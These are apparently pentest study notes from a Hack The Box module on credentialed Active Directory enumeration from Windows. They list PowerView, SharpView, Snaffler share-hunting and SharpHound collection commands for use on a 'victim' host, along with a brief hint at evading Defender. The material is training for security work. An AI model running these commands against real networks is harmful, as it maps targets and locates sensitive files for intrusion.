# Section 15: Credentialed Enumeration - from Windows

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1421
- Code/command blocks: 19

> Terminal output is omitted; only commands & scripts are captured.

```powershell
Get-Module
```

```powershell
Import-Module ActiveDirectory
Get-Module
```

```powershell
Get-ADDomain
```

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

```powershell
Get-ADTrust -Filter *
```

```powershell
Get-ADGroup -Filter * | select name
```

```powershell
Get-ADGroup -Identity "{{GROUP_NAME}}"
```

```powershell
Get-ADGroupMember -Identity "{{GROUP_NAME}}"
```

```powershell
cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
Get-DomainUser -Identity {{USERNAME}} -Domain {{DOMAIN}} | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

```powershell
 Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

```powershell
Get-DomainTrustMapping
```

```powershell
Test-AdminAccess -ComputerName {{COMPUTER_NAME}}
```

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

```powershell
.\SharpView.exe Get-DomainUser -Help
```

```powershell
.\SharpView.exe Get-DomainUser -Identity {{USERNAME}}
```

> **Setup:** get [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler) onto the box first (precompiled `Snaffler.exe` on the Releases page). Runs in your current domain context to hunt shares for sensitive files. Defender flags it — fine on the OSCP AD set, else use an in-memory route.

```powershell
iwr https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe -OutFile Snaffler.exe
```

```bash
Snaffler.exe -s -d {{DOMAIN}} -o snaffler.log -v data
```

```powershell
.\Snaffler.exe  -d {{DOMAIN_UPPER}} -s -v data
```

## Setup: matching BloodHound + SharpHound (run from Windows)

> The collector version **must match** the GUI or ingest fails. Easiest guarantee: download SharpHound from *inside* the BloodHound GUI you're running.

### Option A — BloodHound CE (current, recommended)

1. Install **Docker Desktop** for Windows.
2. Pull & run the official stack:

```powershell
curl.exe -L https://ghst.ly/getbhce -o docker-compose.yml
docker compose up -d
```

3. Grab the auto-generated admin password from the logs, then browse to <http://localhost:8080>:

```powershell
docker compose logs bloodhound | Select-String "Initial"
```

4. In the GUI: **Settings -> Download Collectors -> SharpHound** — this build is guaranteed to match your GUI.

### Option B — BloodHound Legacy 4.3.1 (matches the HTB module)

1. Install **neo4j** + the **BloodHound 4.3.1** GUI (Electron app).
2. Download **SharpHound from the same 4.x line** — [BloodHoundAD/BloodHound `/Collectors`](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) (do **not** use a CE collector with the legacy GUI).

### Workflow: collect on the target, analyze on your box

Run `SharpHound.exe` on the domain-joined victim (below), copy the resulting `.zip` back to your Windows box, and drag-drop it into the BloodHound GUI.

```powershell
 .\SharpHound.exe --help
```

```powershell
.\SharpHound.exe -c All --zipfilename {{OUTPUT}}
```

